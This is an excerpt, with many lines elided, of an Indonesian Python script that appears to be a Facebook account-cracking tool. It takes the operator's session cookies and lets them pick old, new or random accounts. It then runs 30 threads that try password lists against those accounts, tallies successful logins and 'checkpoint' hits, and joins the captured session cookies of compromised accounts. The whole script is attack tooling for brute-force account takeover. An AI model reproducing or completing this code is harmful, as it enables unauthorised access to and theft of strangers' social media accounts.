...
def banner():
	...
	alvino_xy(f'''\t
     {m}8888888        dTb  dTb        888    888
       {k}888        4â€¢   \/   â€¢B      888    888
       {h}888        6â€¢        â€¢P      888    888
       {b}888        'T;      ;P       888    888
       {u}888          'T;   ;P'       8888888888
     {p}8888888         'Â°\/Â°           88888888
    
     
	                 {m}â˜…{k}â˜…{h}â˜…BUCIN TURU{u}{h}â˜…{k}â˜…{m}â˜…{u}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}â€¢{u}] Masukkan Cookies :{asu} ')
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           â€¢ PILIH PENGEN NGAPAIN LO â€¢ [/bold cyan]'))
	print('')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         â€¢ PENGEN CARI AKUN YANG MANA â€¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]ðŸ‡®ðŸ‡©âž£1. Akun Old \nðŸ‡®ðŸ‡©âž£2. Akun New\nðŸ‡®ðŸ‡©âž£3. Random [bold yellow]'))
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]âž¥âž¥âž£[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}PNS-ID-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ðŸ˜´ðŸ˜­MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABARðŸ˜­ðŸ˜´[red]'))
				...
				cetak(nel('[green]      ðŸŽ€ðŸ¤£ SELAMAT ANDA SEDANG HOKI HARI INI ðŸ¤£ðŸŽ€[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      ðŸ˜­SELAMAT ANDA SEDANG HOKI HARI INI ðŸ¤£[purple]')) 
